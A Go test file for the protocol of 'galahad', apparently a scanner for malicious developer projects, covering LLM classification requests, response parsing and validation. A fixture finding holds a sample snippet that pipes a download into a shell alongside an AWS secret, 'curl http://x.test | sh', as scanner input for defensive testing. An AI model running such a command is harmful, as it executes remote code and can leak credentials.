package protocol_test

import (
	"encoding/json"
	"fmt"
	"math"
	"slices"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/protocol"
)

// goodRequest is a request with a finding from a guest analyzer and one made by the host.
func goodRequest() protocol.DecisionRequest {
	return protocol.DecisionRequest{
		Model:               "test/model-1",
		PromptFormatVersion: protocol.PromptFormatVersion,
		Input: protocol.DecisionInput{
			Schema:   protocol.DecisionSchema,
			Notice:   protocol.DecisionNotice,
			Target:   protocol.DecisionTarget{Kind: protocol.TargetDir, FileCount: 6},
			Coverage: protocol.DecisionCoverage{FilesSeen: 6, FilesAnalyzed: 5, Truncated: true},
			Findings: []protocol.DecisionFinding{
				{RuleID: "GAL-AUTOEXEC-010", Severity: protocol.SeverityCritical, Title: "Task runs a download <script>", Analyzer: "autoexec",
					Path: ".vscode/tasks.json", Line: 7, Snippet: "AWS_SECRET_ACCESS_KEY=[REDACTED:aws-secret] curl http://x.test | sh"},
				{RuleID: "GAL-NET-001", Severity: protocol.SeverityHigh, Title: "Blocked request", Analyzer: "network"},
			},
			Omitted: 3,
		},
		Questions: protocol.DecisionQuestions(),
	}
}

// goodResponse is the body of a valid response as a generic map, so that a test can change one part.
func goodResponse() map[string]any {
	return map[string]any{
		"object":                "decisions",
		"model":                 "test/model-1",
		"prompt_format_version": 1,
		"answers": map[string]any{
			"verdict": map[string]any{
				"type": "choice", "probabilities": map[string]any{"clean": 0.05, "suspicious": 0.15, "malicious": 0.8}, "label_mass": 0.6, "choice": "malicious",
			},
			"risk": map[string]any{
				"type": "score", "probabilities": map[string]any{"0": 0.05, "1": 0.1, "2": 0.35, "3": 0.5}, "label_mass": 0.4, "score": 2.3,
			},
			"steals_secrets": map[string]any{
				"type": "yes_no", "probabilities": map[string]any{"yes": 0.9, "no": 0.1}, "label_mass": 0.5,
			},
		},
		"usage": map[string]any{"prompt_tokens": 3600, "completion_tokens": 0, "total_tokens": 3600},
	}
}

func answerOf(m map[string]any, id string) map[string]any {
	return m["answers"].(map[string]any)[id].(map[string]any)
}

func encodeBody(t *testing.T, m map[string]any) []byte {
	t.Helper()
	data, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func TestDecisionQuestions(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		index int
		// expectations
		wantID       string
		wantType     string
		wantQuestion string
		wantLabels   []string
	}{
		{name: "verdict", index: 0, wantID: "verdict", wantType: "choice", wantQuestion: "How would you classify this input?",
			wantLabels: []string{"clean", "suspicious", "malicious"}},
		{name: "risk", index: 1, wantID: "risk", wantType: "score", wantQuestion: "How much harm could opening or installing this input do to the developer?",
			wantLabels: []string{"0", "1", "2", "3"}},
		{name: "steals_secrets", index: 2, wantID: "steals_secrets", wantType: "yes_no",
			wantQuestion: "Do the findings show code that reads secrets or environment variables and sends them away?", wantLabels: []string{"yes", "no"}},
	}
	qs := protocol.DecisionQuestions()
	if len(qs) != len(tests) {
		t.Fatalf("%d questions, want %d", len(qs), len(tests))
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			q := qs[tt.index]
			if q.ID != tt.wantID || q.Type != tt.wantType || q.Question != tt.wantQuestion {
				t.Errorf("question = {%s %s %q}, want {%s %s %q}", q.ID, q.Type, q.Question, tt.wantID, tt.wantType, tt.wantQuestion)
			}
			if got := q.Labels(); !slices.Equal(got, tt.wantLabels) {
				t.Errorf("Labels() = %q, want %q", got, tt.wantLabels)
			}
		})
	}
	t.Run("verdict options have their descriptions", func(t *testing.T) {
		want := []string{
			"Nothing in the findings would harm a developer who opens, installs or runs it.",
			"Something is risky or unusual, but there is no clear intent to harm.",
			"It is built to harm the developer, for example by stealing secrets or running hidden code.",
		}
		for i, o := range qs[0].Options {
			if o.Description != want[i] {
				t.Errorf("option %s description = %q, want %q", o.Name, o.Description, want[i])
			}
		}
	})
	t.Run("every call returns a copy", func(t *testing.T) {
		qs[0].Options[0].Name = "changed"
		if got := protocol.DecisionQuestions()[0].Options[0].Name; got != "clean" {
			t.Errorf("first option = %q after a change of an earlier copy, want clean", got)
		}
	})
}

func TestDecisionRequestKeys(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		pick func(m map[string]any) any
		// expectations
		wantKeys []string
	}{
		{name: "request", pick: func(m map[string]any) any { return m },
			wantKeys: []string{"input", "model", "prompt_format_version", "questions"}},
		{name: "input", pick: func(m map[string]any) any { return m["input"] },
			wantKeys: []string{"coverage", "findings", "notice", "omitted", "schema", "target"}},
		{name: "target", pick: func(m map[string]any) any { return m["input"].(map[string]any)["target"] },
			wantKeys: []string{"file_count", "kind"}},
		{name: "coverage", pick: func(m map[string]any) any { return m["input"].(map[string]any)["coverage"] },
			wantKeys: []string{"files_analyzed", "files_seen", "truncated"}},
		{name: "finding", pick: func(m map[string]any) any { return m["input"].(map[string]any)["findings"].([]any)[0] },
			wantKeys: []string{"analyzer", "line", "path", "rule_id", "severity", "snippet", "title"}},
		{name: "finding made by the host", pick: func(m map[string]any) any { return m["input"].(map[string]any)["findings"].([]any)[1] },
			wantKeys: []string{"analyzer", "rule_id", "severity", "title"}},
		{name: "choice question", pick: func(m map[string]any) any { return m["questions"].([]any)[0] },
			wantKeys: []string{"id", "options", "question", "type"}},
		{name: "option", pick: func(m map[string]any) any { return m["questions"].([]any)[0].(map[string]any)["options"].([]any)[0] },
			wantKeys: []string{"description", "name"}},
		{name: "score question", pick: func(m map[string]any) any { return m["questions"].([]any)[1] },
			wantKeys: []string{"id", "levels", "question", "type"}},
		{name: "yes_no question", pick: func(m map[string]any) any { return m["questions"].([]any)[2] },
			wantKeys: []string{"id", "question", "type"}},
	}
	data, err := goodRequest().Encode()
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(data, &m); err != nil {
		t.Fatal(err)
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			obj, ok := tt.pick(m).(map[string]any)
			if !ok {
				t.Fatal("the part is not an object")
			}
			var got []string
			for k := range obj {
				got = append(got, k)
			}
			slices.Sort(got)
			if !slices.Equal(got, tt.wantKeys) {
				t.Errorf("keys = %q, want %q", got, tt.wantKeys)
			}
		})
	}
	t.Run("the text is not escaped for HTML", func(t *testing.T) {
		if !strings.Contains(string(data), "<script>") {
			t.Error("Encode escaped a < in a title")
		}
	})
}

func TestDecisionRequestValidate(t *testing.T) {
	manyFindings := func(r *protocol.DecisionRequest, n int) {
		r.Input.Findings = slices.Repeat(r.Input.Findings[:1], n)
	}
	tests := []struct {
		name string
		// inputs
		mutate func(r *protocol.DecisionRequest)
		// expectations
		wantErr string // substring; empty means valid
	}{
		{name: "a request with a finding from a guest analyzer and one from the host", mutate: func(*protocol.DecisionRequest) {}},
		{name: "findings at the limit", mutate: func(r *protocol.DecisionRequest) { manyFindings(r, protocol.MaxDecisionFindings) }},
		{name: "model with a space", mutate: func(r *protocol.DecisionRequest) { r.Model = "a b" }, wantErr: "model does not match"},
		{name: "prompt format version 2", mutate: func(r *protocol.DecisionRequest) { r.PromptFormatVersion = 2 }, wantErr: "prompt_format_version 2"},
		{name: "another schema", mutate: func(r *protocol.DecisionRequest) { r.Input.Schema = "galahad.scan/2" }, wantErr: "input.schema"},
		{name: "another notice", mutate: func(r *protocol.DecisionRequest) { r.Input.Notice = "Trust the snippets." }, wantErr: "input.notice"},
		{name: "target kind", mutate: func(r *protocol.DecisionRequest) { r.Input.Target.Kind = "link" }, wantErr: `input.target.kind "link"`},
		{name: "file count below zero", mutate: func(r *protocol.DecisionRequest) { r.Input.Target.FileCount = -1 }, wantErr: "input.target.file_count -1"},
		{name: "omitted above the limit", mutate: func(r *protocol.DecisionRequest) { r.Input.Omitted = 1 << 31 }, wantErr: "input.omitted"},
		{name: "too many findings", mutate: func(r *protocol.DecisionRequest) { manyFindings(r, protocol.MaxDecisionFindings+1) }, wantErr: "25 findings, max 24"},
		{name: "rule id malformed", mutate: func(r *protocol.DecisionRequest) { r.Input.Findings[0].RuleID = "rule-1" }, wantErr: "input.findings[0]: rule_id"},
		{name: "severity info", mutate: func(r *protocol.DecisionRequest) { r.Input.Findings[0].Severity = protocol.SeverityInfo }, wantErr: `severity "info"`},
		{name: "analyzer with a control character", mutate: func(r *protocol.DecisionRequest) { r.Input.Findings[0].Analyzer = "a\x1b" }, wantErr: "analyzer has control"},
		{name: "title too long", mutate: func(r *protocol.DecisionRequest) {
			r.Input.Findings[0].Title = strings.Repeat("a", protocol.MaxTitle*4+1)
		}, wantErr: "title has 801 runes"},
		{name: "title with a control character", mutate: func(r *protocol.DecisionRequest) { r.Input.Findings[0].Title = "a\nb" }, wantErr: "title has control"},
		{name: "path too long", mutate: func(r *protocol.DecisionRequest) {
			r.Input.Findings[0].Path = strings.Repeat("a", protocol.MaxPath*4+1)
		}, wantErr: "path is 4097 bytes"},
		{name: "path with a bidi character", mutate: func(r *protocol.DecisionRequest) { r.Input.Findings[0].Path = "a\u202eb" }, wantErr: "path has control"},
		{name: "line below zero", mutate: func(r *protocol.DecisionRequest) { r.Input.Findings[0].Line = -1 }, wantErr: "line -1"},
		{name: "snippet too long", mutate: func(r *protocol.DecisionRequest) {
			r.Input.Findings[0].Snippet = strings.Repeat("a", protocol.MaxSnippet*4+1)
		}, wantErr: "snippet has 801 runes"},
		{name: "snippet with a control character", mutate: func(r *protocol.DecisionRequest) { r.Input.Findings[0].Snippet = "a\x00b" }, wantErr: "snippet has control"},
		{name: "questions changed", mutate: func(r *protocol.DecisionRequest) { r.Questions[1].Levels[0] = "harmless" }, wantErr: "questions are not the fixed questions"},
		{name: "a question missing", mutate: func(r *protocol.DecisionRequest) { r.Questions = r.Questions[:2] }, wantErr: "questions are not the fixed questions"},
		{name: "request over the size limit", mutate: func(r *protocol.DecisionRequest) {
			manyFindings(r, protocol.MaxDecisionFindings)
			for i := range r.Input.Findings {
				r.Input.Findings[i].Snippet = strings.Repeat("\u2028", protocol.MaxSnippet*4) // six bytes each when encoded
			}
		}, wantErr: "request is"},
		{name: "request over the size limit once escaped for HTML", mutate: func(r *protocol.DecisionRequest) {
			manyFindings(r, protocol.MaxDecisionFindings)
			for i := range r.Input.Findings {
				r.Input.Findings[i].Path = strings.Repeat("<", 2550) // short on the wire, six bytes each in a report
			}
		}, wantErr: "request is"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := goodRequest()
			tt.mutate(&r)
			checkErr(t, r.Validate(), tt.wantErr)
		})
	}
}

func checkErr(t *testing.T, err error, wantErr string) {
	t.Helper()
	if wantErr == "" {
		if err != nil {
			t.Fatalf("got error %v, want nil", err)
		}
		return
	}
	if err == nil || !strings.Contains(err.Error(), wantErr) {
		t.Errorf("got error %v, want one containing %q", err, wantErr)
	}
}

func TestParseDecisionResponse(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		mutate func(m map[string]any)
		raw    []byte // when set, the body instead of the mutated good response
		// expectations
		wantErr     string // substring; empty means valid
		wantAbsent  string // text that must not be in the stored answers
		wantTokens  int
		wantChoice  string
		wantNoScore string  // id of an answer that has no score
		wantScore   float64 // the score of the risk answer, to within 0.001; 0 means not checked
	}{
		{name: "a valid response", mutate: func(map[string]any) {}, wantTokens: 3600, wantChoice: "malicious"},
		{name: "a response of the live API, 2026-10-26", raw: []byte(`{"answers":{"risk":{"label_mass":0.999902918380958,"probabilities":{"0":5.714260023314e-07,"1":6.961393822391209e-06,"2":0.00012339365797840718,"3":0.999869073522197},"score":2.9998609692763702,"type":"score"},"steals_secrets":{"label_mass":0.9626706521675075,"probabilities":{"no":2.382369552559206e-07,"yes":0.9999997617630446},"type":"yes_no"},"verdict":{"choice":"malicious","label_mass":0.9999903639203892,"probabilities":{"clean":9.422410824096034e-07,"malicious":0.9999953311231453,"suspicious":3.7266357724177115e-06},"type":"choice"}},"model":"deepseek/deepseek-v4.1-flash","object":"decisions","prompt_format_version":1,"usage":{"completion_tokens":0,"prompt_tokens":897,"total_tokens":897}}`),
			wantTokens: 897, wantChoice: "malicious", wantScore: 3.0},
		{name: "unknown fields at every level are dropped", mutate: func(m map[string]any) {
			m["system_fingerprint"] = "fp-extra"
			m["usage"].(map[string]any)["cached_tokens"] = 5
			answerOf(m, "verdict")["rationale"] = "extra-text"
		}, wantTokens: 3600, wantChoice: "malicious", wantAbsent: "extra"},
		{name: "a verdict without a choice", mutate: func(m map[string]any) { delete(answerOf(m, "verdict"), "choice") }, wantTokens: 3600},
		{name: "a choice on a yes_no answer is dropped", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["choice"] = "dropped-choice"
		}, wantTokens: 3600, wantChoice: "malicious", wantAbsent: "dropped-choice"},
		{name: "a score on a choice answer is dropped", mutate: func(m map[string]any) { answerOf(m, "verdict")["score"] = 9.5 },
			wantTokens: 3600, wantChoice: "malicious", wantNoScore: "verdict"},
		{name: "a body over the limit", raw: []byte(strings.Repeat(" ", protocol.MaxDecisionResponse+1)), wantErr: "response is 65537 bytes"},
		{name: "a body that is not JSON", raw: []byte("<html>bad gateway</html>"), wantErr: "not the expected JSON"},
		{name: "a body that is a list", raw: []byte("[]"), wantErr: "not the expected JSON"},
		{name: "data after the object", raw: append(encodeBody(t, goodResponse()), []byte(` {}`)...), wantErr: "trailing data"},
		{name: "object other than decisions", mutate: func(m map[string]any) { m["object"] = "chat.completion" }, wantErr: `object "chat.completion"`},
		{name: "prompt format version 2", mutate: func(m map[string]any) { m["prompt_format_version"] = 2 }, wantErr: "prompt_format_version"},
		{name: "prompt format version missing", mutate: func(m map[string]any) { delete(m, "prompt_format_version") }, wantErr: "prompt_format_version"},
		{name: "usage missing", mutate: func(m map[string]any) { delete(m, "usage") }, wantErr: "usage has no"},
		{name: "total tokens missing", mutate: func(m map[string]any) { delete(m["usage"].(map[string]any), "total_tokens") }, wantErr: "usage has no"},
		{name: "a negative token count", mutate: func(m map[string]any) { m["usage"].(map[string]any)["prompt_tokens"] = -1 }, wantErr: "usage.prompt_tokens -1"},
		{name: "a token count over the limit", mutate: func(m map[string]any) { m["usage"].(map[string]any)["total_tokens"] = 1 << 31 }, wantErr: "usage.total_tokens"},
		{name: "a token count that is not whole", mutate: func(m map[string]any) { m["usage"].(map[string]any)["prompt_tokens"] = 1.5 }, wantErr: "not the expected JSON"},
		{name: "an answer that is null", mutate: func(m map[string]any) { m["answers"].(map[string]any)["risk"] = nil }, wantErr: `answer for "risk" is null`},
		{name: "label mass missing", mutate: func(m map[string]any) { delete(answerOf(m, "risk"), "label_mass") }, wantErr: "no label_mass"},
		{name: "a probability that is null", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["probabilities"].(map[string]any)["no"] = nil
		}, wantErr: `probability of "no" is null`},
		{name: "a probability given as a string", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["probabilities"].(map[string]any)["yes"] = "0.9"
		}, wantErr: "not the expected JSON"},
		{name: "an empty model", mutate: func(m map[string]any) { m["model"] = "" }, wantErr: "model is 0 bytes"},
		{name: "a model that is too long", mutate: func(m map[string]any) { m["model"] = strings.Repeat("m", 129) }, wantErr: "model is 129 bytes"},
		{name: "a bidi character in the model", mutate: func(m map[string]any) { m["model"] = "model\u202eevil" }, wantErr: "model has control or bidi"},
		{name: "a missing ID", mutate: func(m map[string]any) { delete(m["answers"].(map[string]any), "risk") }, wantErr: `no answer for "risk"`},
		{name: "an extra ID", mutate: func(m map[string]any) {
			m["answers"].(map[string]any)["extra"] = answerOf(m, "steals_secrets")
		}, wantErr: `answer for "extra", which was not asked`},
		{name: "a type that does not match", mutate: func(m map[string]any) { answerOf(m, "risk")["type"] = "choice" }, wantErr: `answers["risk"]: type "choice", want "score"`},
		{name: "a wrong label key", mutate: func(m map[string]any) {
			ps := answerOf(m, "verdict")["probabilities"].(map[string]any)
			ps["evil"] = ps["malicious"]
			delete(ps, "malicious")
		}, wantErr: `label "evil", which was not asked`},
		{name: "a score keyed by level name", mutate: func(m map[string]any) {
			answerOf(m, "risk")["probabilities"] = map[string]any{"no harm": 0.05, "minor harm": 0.1, "serious harm": 0.35, "severe harm": 0.5}
		}, wantErr: `label "minor harm", which was not asked`},
		{name: "a score key past the last level", mutate: func(m map[string]any) {
			answerOf(m, "risk")["probabilities"] = map[string]any{"0": 0.05, "1": 0.1, "2": 0.35, "3": 0.4, "4": 0.1}
		}, wantErr: `label "4", which was not asked`},
		{name: "a score key with a leading zero", mutate: func(m map[string]any) {
			answerOf(m, "risk")["probabilities"] = map[string]any{"0": 0.05, "1": 0.1, "2": 0.35, "03": 0.5}
		}, wantErr: `label "03", which was not asked`},
		{name: "a score key that is negative", mutate: func(m map[string]any) {
			answerOf(m, "risk")["probabilities"] = map[string]any{"-1": 0.05, "1": 0.1, "2": 0.35, "3": 0.5}
		}, wantErr: `label "-1", which was not asked`},
		{name: "a missing label", mutate: func(m map[string]any) {
			delete(answerOf(m, "verdict")["probabilities"].(map[string]any), "clean")
		}, wantErr: `no label "clean"`},
		{name: "a value of 1.7", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["probabilities"] = map[string]any{"yes": 1.7, "no": -0.7}
		}, wantErr: "probability of yes 1.7 out of range"},
		{name: "a sum of 0.5", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["probabilities"] = map[string]any{"yes": 0.25, "no": 0.25}
		}, wantErr: "sum to 0.500"},
		{name: "a sum of 0.98, on the margin", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["probabilities"] = map[string]any{"yes": 0.9, "no": 0.08}
		}, wantTokens: 3600, wantChoice: "malicious"},
		{name: "a sum of 1.02, on the margin", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["probabilities"] = map[string]any{"yes": 0.9, "no": 0.12}
		}, wantTokens: 3600, wantChoice: "malicious"},
		{name: "a sum of 1.03, over the margin", mutate: func(m map[string]any) {
			answerOf(m, "steals_secrets")["probabilities"] = map[string]any{"yes": 0.9, "no": 0.13}
		}, wantErr: "sum to 1.030"},
		{name: "a choice that is not an option", mutate: func(m map[string]any) { answerOf(m, "verdict")["choice"] = "evil" }, wantErr: `choice "evil" is not an option`},
		{name: "a score of 3.5", mutate: func(m map[string]any) { answerOf(m, "risk")["score"] = 3.5 }, wantErr: "score 3.5 out of range"},
		{name: "a score missing", mutate: func(m map[string]any) { delete(answerOf(m, "risk"), "score") }, wantErr: "no score"},
		{name: "a label mass of -0.1", mutate: func(m map[string]any) { answerOf(m, "risk")["label_mass"] = -0.1 }, wantErr: "label_mass -0.1 out of range"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := tt.raw
			if body == nil {
				m := goodResponse()
				tt.mutate(m)
				body = encodeBody(t, m)
			}
			answers, usage, err := protocol.ParseDecisionResponse(body, protocol.DecisionQuestions())
			if tt.wantErr != "" {
				checkErr(t, err, tt.wantErr)
				return
			}
			if err != nil {
				t.Fatalf("ParseDecisionResponse: %v", err)
			}
			if usage.PromptTokens != tt.wantTokens || usage.TotalTokens != tt.wantTokens {
				t.Errorf("usage = %+v, want %d tokens", usage, tt.wantTokens)
			}
			if got := answers.Questions["verdict"].Choice; got != tt.wantChoice {
				t.Errorf("verdict choice = %q, want %q", got, tt.wantChoice)
			}
			if tt.wantScore != 0 {
				if sc := answers.Questions["risk"].Score; sc == nil || math.Abs(*sc-tt.wantScore) > 0.001 {
					t.Errorf("risk score = %v, want %v", sc, tt.wantScore)
				}
			}
			if tt.wantNoScore != "" && answers.Questions[tt.wantNoScore].Score != nil {
				t.Errorf("answer %s has a score, want none", tt.wantNoScore)
			}
			if tt.wantAbsent != "" {
				data, err := json.Marshal(answers)
				if err != nil {
					t.Fatal(err)
				}
				if strings.Contains(string(data), tt.wantAbsent) {
					t.Errorf("stored answers %s hold %q, want it dropped", data, tt.wantAbsent)
				}
			}
		})
	}
}

// okDecision is a Decision of a call that worked.
func okDecision() *protocol.Decision {
	answers, usage, err := protocol.ParseDecisionResponse(encodeBodyNoT(goodResponse()), protocol.DecisionQuestions())
	if err != nil {
		panic(err)
	}
	req := goodRequest()
	return &protocol.Decision{
		Provider: "test-provider", URL: "https://api.example.test", Model: "test/model-1", Status: protocol.DecisionOK,
		Sent: &req, Answers: &answers, Usage: &usage, RequestID: "req-0123abcd",
		Redactions: map[string]int{protocol.RedactAWSSecret: 1}, LatencyMS: 1200, Attempts: 1,
	}
}

func encodeBodyNoT(m map[string]any) []byte {
	data, err := json.Marshal(m)
	if err != nil {
		panic(err)
	}
	return data
}

func failedDecision() *protocol.Decision {
	req := goodRequest()
	return &protocol.Decision{
		Provider: "test-provider", URL: "https://api.example.test", Model: "test/model-1", Status: protocol.DecisionFailed,
		Error: &protocol.DecisionError{Code: protocol.DecisionErrStatus, HTTPStatus: 402, Message: "insufficient credit"},
		Sent:  &req, LatencyMS: 300, Attempts: 1,
	}
}

func skippedDecision() *protocol.Decision {
	return &protocol.Decision{
		Provider: "test-provider", URL: "https://api.example.test", Model: "test/model-1", Status: protocol.DecisionSkipped, Reason: protocol.DecisionSkipNoFindings,
	}
}

func TestDecisionValidate(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		base   func() *protocol.Decision
		mutate func(d *protocol.Decision)
		// expectations
		wantErr string // substring; empty means valid
	}{
		{name: "a call that worked", base: okDecision, mutate: func(*protocol.Decision) {}},
		{name: "a call that failed", base: failedDecision, mutate: func(*protocol.Decision) {}},
		{name: "a skipped decision", base: skippedDecision, mutate: func(*protocol.Decision) {}},
		{name: "a failed call that has no HTTP status", base: failedDecision, mutate: func(d *protocol.Decision) {
			d.Error = &protocol.DecisionError{Code: protocol.DecisionErrTimeout, Message: "the provider did not answer in time"}
		}},
		{name: "provider with a capital", base: okDecision, mutate: func(d *protocol.Decision) { d.Provider = "Netra" }, wantErr: "provider"},
		{name: "provider that is empty", base: okDecision, mutate: func(d *protocol.Decision) { d.Provider = "" }, wantErr: "provider"},
		{name: "provider too long", base: okDecision, mutate: func(d *protocol.Decision) { d.Provider = "a" + strings.Repeat("b", 32) }, wantErr: "provider"},
		{name: "url too long", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "https://a.test/" + strings.Repeat("a", 250) }, wantErr: "url is 265 bytes"},
		{name: "url with a control character", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "https://a.test/\x1b" }, wantErr: "control or bidi"},
		{name: "url with a query", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "https://a.test/?x=1" }, wantErr: "a query or a fragment"},
		{name: "url with a fragment", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "https://a.test/#x" }, wantErr: "a query or a fragment"},
		{name: "url that does not parse", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "https://a.test/%zz" }, wantErr: "not a valid URL"},
		{name: "url with user info", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "https://user:pw@a.test" }, wantErr: "no user info"},
		{name: "url without a host", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "https:///v1" }, wantErr: "with a host"},
		{name: "url with plain http", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "http://a.test" }, wantErr: `scheme "http"`},
		{name: "url with another scheme", base: okDecision, mutate: func(d *protocol.Decision) { d.URL = "ftp://a.test" }, wantErr: `scheme "ftp"`},
		{name: "model with a space", base: okDecision, mutate: func(d *protocol.Decision) { d.Model = "a b" }, wantErr: "model does not match"},
		{name: "status unknown", base: okDecision, mutate: func(d *protocol.Decision) { d.Status = "maybe" }, wantErr: `status "maybe"`},
		{name: "skipped without a reason", base: skippedDecision, mutate: func(d *protocol.Decision) { d.Reason = "" }, wantErr: "does not fit status skipped"},
		{name: "skipped with another reason", base: skippedDecision, mutate: func(d *protocol.Decision) { d.Reason = "other" }, wantErr: "does not fit status skipped"},
		{name: "ok with a reason", base: okDecision, mutate: func(d *protocol.Decision) { d.Reason = protocol.DecisionSkipNoFindings }, wantErr: "does not fit status ok"},
		{name: "failed without an error", base: failedDecision, mutate: func(d *protocol.Decision) { d.Error = nil }, wantErr: "error does not fit status failed"},
		{name: "ok with an error", base: okDecision, mutate: func(d *protocol.Decision) {
			d.Error = &protocol.DecisionError{Code: protocol.DecisionErrInvalid, Message: "x"}
		}, wantErr: "error does not fit status ok"},
		{name: "error code unknown", base: failedDecision, mutate: func(d *protocol.Decision) { d.Error.Code = "boom" }, wantErr: `error: code "boom"`},
		{name: "status code without an HTTP status", base: failedDecision, mutate: func(d *protocol.Decision) { d.Error.HTTPStatus = 0 }, wantErr: "http_status 0 does not fit code status"},
		{name: "HTTP status on another code", base: failedDecision, mutate: func(d *protocol.Decision) { d.Error.Code = protocol.DecisionErrNetwork }, wantErr: "http_status 402 does not fit code network"},
		{name: "HTTP status below 100", base: failedDecision, mutate: func(d *protocol.Decision) { d.Error.HTTPStatus = 99 }, wantErr: "http_status 99"},
		{name: "HTTP status above 599", base: failedDecision, mutate: func(d *protocol.Decision) { d.Error.HTTPStatus = 600 }, wantErr: "http_status 600"},
		{name: "error message too long", base: failedDecision, mutate: func(d *protocol.Decision) {
			d.Error.Message = strings.Repeat("a", protocol.MaxDecisionError+1)
		}, wantErr: "message has 201 runes"},
		{name: "error message with a control character", base: failedDecision, mutate: func(d *protocol.Decision) { d.Error.Message = "a\nb" }, wantErr: "message has control"},
		{name: "ok without the request", base: okDecision, mutate: func(d *protocol.Decision) { d.Sent = nil }, wantErr: "sent does not fit status ok"},
		{name: "skipped with a request", base: skippedDecision, mutate: func(d *protocol.Decision) {
			r := goodRequest()
			d.Sent = &r
		}, wantErr: "sent does not fit status skipped"},
		{name: "the request is invalid", base: okDecision, mutate: func(d *protocol.Decision) { d.Sent.PromptFormatVersion = 2 }, wantErr: "sent: prompt_format_version 2"},
		{name: "the request names another model", base: okDecision, mutate: func(d *protocol.Decision) { d.Sent.Model = "other/model" }, wantErr: "sent.model is not the model"},
		{name: "ok without answers", base: okDecision, mutate: func(d *protocol.Decision) { d.Answers = nil }, wantErr: "answers or usage do not fit status ok"},
		{name: "ok without usage", base: okDecision, mutate: func(d *protocol.Decision) { d.Usage = nil }, wantErr: "answers or usage do not fit status ok"},
		{name: "failed with answers", base: failedDecision, mutate: func(d *protocol.Decision) { d.Answers = okDecision().Answers }, wantErr: "answers or usage do not fit status failed"},
		{name: "answers missing a question", base: okDecision, mutate: func(d *protocol.Decision) { delete(d.Answers.Questions, "risk") }, wantErr: `answers: no answer for "risk"`},
		{name: "answers with a probability over 1", base: okDecision, mutate: func(d *protocol.Decision) {
			d.Answers.Questions["steals_secrets"].Probabilities["yes"] = 1.7
		}, wantErr: "probability of yes 1.7"},
		{name: "usage below zero", base: okDecision, mutate: func(d *protocol.Decision) { d.Usage.PromptTokens = -1 }, wantErr: "usage out of range"},
		{name: "usage over the limit", base: okDecision, mutate: func(d *protocol.Decision) { d.Usage.TotalTokens = 1 << 31 }, wantErr: "usage out of range"},
		{name: "request id at the limit", base: okDecision, mutate: func(d *protocol.Decision) { d.RequestID = strings.Repeat("a", protocol.MaxDecisionRequestID) }},
		{name: "request id too long", base: okDecision, mutate: func(d *protocol.Decision) { d.RequestID = strings.Repeat("a", protocol.MaxDecisionRequestID+1) }, wantErr: "request_id is 129 bytes"},
		{name: "request id with a newline", base: okDecision, mutate: func(d *protocol.Decision) { d.RequestID = "a\nb" }, wantErr: "not printable ASCII"},
		{name: "request id with a delete character", base: okDecision, mutate: func(d *protocol.Decision) { d.RequestID = "a\x7f" }, wantErr: "not printable ASCII"},
		{name: "request id outside ASCII", base: okDecision, mutate: func(d *protocol.Decision) { d.RequestID = "caf\u00e9" }, wantErr: "not printable ASCII"},
		{name: "redaction kind unknown", base: okDecision, mutate: func(d *protocol.Decision) { d.Redactions = map[string]int{"password": 1} }, wantErr: `redaction kind "password"`},
		{name: "redaction kind of the key", base: okDecision, mutate: func(d *protocol.Decision) { d.Redactions = map[string]int{protocol.RedactKey: 2} }},
		{name: "redaction count of zero", base: okDecision, mutate: func(d *protocol.Decision) { d.Redactions[protocol.RedactAWSSecret] = 0 }, wantErr: "redactions[aws-secret] is 0"},
		{name: "redaction count over the limit", base: okDecision, mutate: func(d *protocol.Decision) {
			d.Redactions[protocol.RedactAWSSecret] = protocol.MaxDecisionRequest + 1
		}, wantErr: "redactions[aws-secret]"},
		{name: "latency at the limit", base: okDecision, mutate: func(d *protocol.Decision) { d.LatencyMS = protocol.MaxDecisionLatencyMS }},
		{name: "latency below zero", base: okDecision, mutate: func(d *protocol.Decision) { d.LatencyMS = -1 }, wantErr: "latency_ms -1"},
		{name: "latency over the limit", base: okDecision, mutate: func(d *protocol.Decision) { d.LatencyMS = protocol.MaxDecisionLatencyMS + 1 }, wantErr: "latency_ms 160001"},
		{name: "skipped with attempts", base: skippedDecision, mutate: func(d *protocol.Decision) { d.Attempts = 1 }, wantErr: "attempts 1, want 0"},
		{name: "attempts at the limit", base: okDecision, mutate: func(d *protocol.Decision) { d.Attempts = protocol.MaxDecisionAttempts }},
		{name: "no attempts", base: okDecision, mutate: func(d *protocol.Decision) { d.Attempts = 0 }, wantErr: "attempts 0 out of range 1-3"},
		{name: "too many attempts", base: okDecision, mutate: func(d *protocol.Decision) { d.Attempts = 4 }, wantErr: "attempts 4 out of range 1-3"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := tt.base()
			tt.mutate(d)
			checkErr(t, d.Validate(), tt.wantErr)
		})
	}
}

func TestDecisionWorstCaseSize(t *testing.T) {
	// The longest request that is allowed: 24 findings whose runes are ones that JSON writes with six
	// bytes, either always (U+2028) or in a report (<, & and >, which the wire form leaves alone).
	worstRequest := func(title, path, snippet string) *protocol.DecisionRequest {
		r := goodRequest()
		r.Input.Findings = slices.Repeat(r.Input.Findings[:1], protocol.MaxDecisionFindings)
